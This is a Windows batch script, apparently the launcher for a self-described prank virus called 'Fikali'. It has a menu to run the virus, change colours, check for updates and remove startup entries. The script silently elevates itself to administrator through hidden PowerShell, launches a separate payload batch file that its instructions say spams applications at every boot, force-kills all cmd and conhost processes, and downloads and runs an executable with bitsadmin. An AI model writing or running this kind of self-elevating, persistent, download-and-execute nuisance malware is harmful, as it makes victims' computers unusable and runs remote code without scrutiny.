@echo off
call :Adm
chcp 866
color e
ver | find "5.0" >nul && exit
cls
goto pwd

:pwd
cls
title Password...
type C:\fikali\files\art.txt
echo.
echo Please enter the password (it is written in my github repository or write "fikali" and press Enter)

echo.
Set /p choice="Password: "
if not defined choice goto pwd
if "%choice%"=="fiksuprpak" (goto menu)
if "%choice%"=="fikali" (goto pass)
cls
goto pwd

:pass
cls
start C:\fikali\files\pass.txt
goto pwd

:menu
cls
title Fikali by SuperPaket123YT and help from GGYT :3
type C:\fikali\files\art.txt
echo.
echo Choose an action:
echo.
echo 1 - Run a virus
echo 2 - Settings
echo 3 - Remove virus from startup
echo 4 - Instruction
echo 5 - Exit

echo.
Set /p choice="Your choice: "
if not defined choice goto menu
if "%choice%"=="1" (goto q1)
if "%choice%"=="2" (goto setng)
if "%choice%"=="3" (goto drs)
if "%choice%"=="4" (goto hlp)
if "%choice%"=="5" (goto exit)
cls
goto menu

:q1
cls
type C:\fikali\files\art.txt
echo.
echo Are you sure you want to launch a virus? (y/n)

echo.
Set /p choice="ChOiCe: "
if not defined choice goto q
if "%choice%"=="y" (goto q2)
if "%choice%"=="n" (goto menu)
cls
goto q

:q2
cls
type C:\fikali\files\art.txt
echo.
echo LAST WARNING!!! 
echo This application will turn on EVERY time you turn on your PC / LAPTOP!!! Are you confident in your actions? (y/n)

echo.
Set /p choice="CHOICE: "
if not defined choice goto q2
if "%choice%"=="y" (goto strt)
if "%choice%"=="n" (goto menu)

:strt
cls
start C:\fikali\files\bomb\startall.bat
cls
goto stop

:stop
cls
type C:\fikali\files\art.txt
echo.
echo Press Enter to close all.
pause >nul
taskkill /IM cmd.exe /F
taskkill /IM conhost.exe /F
exit

:drs
cls
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v iexplore /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v calc /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v explorer /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v paint /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v notepad /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v control /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ramspam /f
cls
type C:\fikali\files\art.txt
echo.
echo Virus from startup removed
echo.
echo Press Enter to continue...
pause >nul
goto menu

:setng
cls
type C:\fikali\files\art.txt
echo.
echo Select an item:
echo.
echo 1 - Change text color
echo 2 - Update Center
echo 3 - Back

echo.
Set /p choice="Choice: "
if not defined choice goto setng
if "%choice%"=="1" (goto color)
if "%choice%"=="2" (goto updcenter)
if "%choice%"=="3" (goto menu)
cls
goto setng

:color
cls
type C:\fikali\files\art.txt
echo.
echo Select text color
echo.
echo 1 - Red
echo 2 - Green
echo 3 - Yellow
echo 4 - Cyan
echo 5 - Blue
echo 6 - Black
echo 7 - White
echo 8 - As in command line
echo 9 - DO NOT CHOOSE THIS COLOR! EYES OUT!
echo 10 - Back

echo.
Set /p choice="Choice: "
if not defined choice goto color
if "%choice%"=="1" (goto red)
if "%choice%"=="2" (goto green)
if "%choice%"=="3" (goto yellow)
if "%choice%"=="4" (goto cyan)
if "%choice%"=="5" (goto blue)
if "%choice%"=="6" (goto black)
if "%choice%"=="7" (goto white)
if "%choice%"=="8" (goto cmd)
if "%choice%"=="9" (goto myeyes)
if "%choice%"=="10" (goto setng)
cls
goto color

:red
cls
color c
goto menu

:green
cls
color 2
goto menu

:yellow
cls
color e
goto menu

:cyan
cls
color b
goto menu

:blue
cls
color 1
goto menu

:black
cls
color f0
goto menu

:white
cls
color f
goto menu

:cmd
cls
color 7
goto menu

:myeyes
cls
color ae
goto menu

:updcenter
cls
type C:\fikali\files\art.txt
echo.
echo %name%, would you like to check for updates? (y/n)
echo.

Set /p upd="Your choice: "
if not defined upd goto updcenter
if "%upd%"=="y" (goto updchk)
if "%upd%"=="n" (goto setng)
cls
goto updcenter

:updchk
cls
del C:\temp_fikali\ver.txt >nul
bitsadmin.exe /transfer "GGYT" https://raw.githubusercontent.com/SuperPaket123YT/Fikali/fikali/ver.txt C:\temp_fikali\ver.txt >nul
cd C:\temp_fikali
find /I ver.txt "2.0" >nul
if %errorlevel% equ 0 (
  goto updno
) else (
    goto updfind
  )
goto updchk

:updfind
cls
type C:\fikali\files\art.txt
echo.
echo Update found. Download? (y/n)
echo.

Set /p updd="Your choice: "
if not defined updd goto updfind
if "%updd%"=="y" (goto upddown)
if "%updd%"=="n" (goto setng)
cls
goto updfind

:upddown
cls
type C:\fikali\files\art.txt
echo.
echo Downloading...
bitsadmin.exe /transfer "GGYT" https://github.com/SuperPaket123YT/Fikali/releases/download/fikalivirus/Fikali.exe C:\temp_fikali\Fikali.exe >nul
cls
type C:\fikali\files\art.txt
echo.
echo Download complete. Installation....
timeout /t 5 /nobreak
start C:\temp_fikali\Fikali.exe
exit

:updno
type C:\Fikali\files\art.txt
echo.
echo You have the latest version installed.
echo.
echo Press Enter to return to the menu...
pause >nul
goto setng

:exit
cls
type C:\fikali\files\art.txt
echo.
echo Are you sure you want to exit? (y/n)

echo.
Set /p choice="Choice: "
if not defined choice goto exit
if "%choice%"=="y" (goto exwt)
if "%choice%"=="n" (goto menu)
cls
goto exit

:exwt
cls
type C:\fikali\files\art.txt
echo.
echo Please wait...
timeout /t 5 /nobreak >nul
del C:\temp_fikali /s /q
exit

:hlp
cls
type C:\fikali\files\art.txt
echo.
echo !!!!FIKALI, THIS IS A VIRUS THAT CAN LOAD YOUR SYSTEM TO THE POINT YOU CANNOT USE IT!!!
echo.
echo Instruction:
echo.
echo When you come to the application interface, you see 5 selection lines:
echo.
echo 1 - Run a virus
echo 2 - Settings
echo 3 - Remove virus from startup
echo 4 - Instructions (this window)
echo 5 - Exit
echo.
echo Read more (press Enter)
pause >nul
cls
type C:\fikali\files\art.txt
echo.
echo Step 1: "Run a virus"
echo.
echo If you select "1 - Run a virus", then 2 warnings will appear indicating
echo that restarting the computer will not help you, since this virus is registered in startup.
echo Then spamming with different applications and tabs will begin. 
echo After restarting the PC, everything will start again. See the solution to this in point 3
echo. 
echo Read more (press Enter)
pause >nul
cls
type C:\fikali\files\art.txt
echo.
echo Step 2: "Settings"
echo.
echo When you go to "Settings" there will be items:
echo.
echo 1 - Change text color
echo 2 - Update Center (soon)
echo 3 - Back
echo.
echo Read more (press Enter)
pause >nul
cls
type C:\fikali\files\art.txt
echo.
echo Step 2.1: "Change text color"
echo.
echo When you select this option, colors to choose from will appear, such as red, yellow, blue, cyan, green, etc.
echo.
echo Read more (press Enter)
pause >nul
cls
type C:\fikali\files\art.txt
echo.
echo Step 2.2: "Update Center"
echo.
echo It doesn't work yet. Why write instructions for it?
echo.
echo Read more (press Enter)
pause >nul
cls
type C:\fikali\files\art.txt
echo.
echo Step 2.3: "Back"
echo.
echo By selecting this item, you will return to the main menu of the application.
echo.
echo Read more (press Enter)
pause >nul
cls
type C:\fikali\files\art.txt
echo.
echo Step 3: "Remove virus from startup"
echo.
echo When you select this item, the virus will not load when you turn on the PC
echo.
echo Read more (press Enter)
pause >nul
cls
type C:\fikali\files\art.txt
echo.
echo Step 4: "Instructions" (this window)
echo.
echo Why are you reading the instructions for instructions?
echo.
echo Read more (press Enter)
pause >nul
cls
type C:\fikali\files\art.txt
echo.
echo Step 5: "Exit"
echo.
echo When you select this item, the application will ask you "Are you sure you want to exit?"
echo If you press "y" and Enter, the application will delete temporary files and close.
echo.
echo End of instructions
echo.
echo To return to the menu press Enter...
pause >nul
goto menu

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)
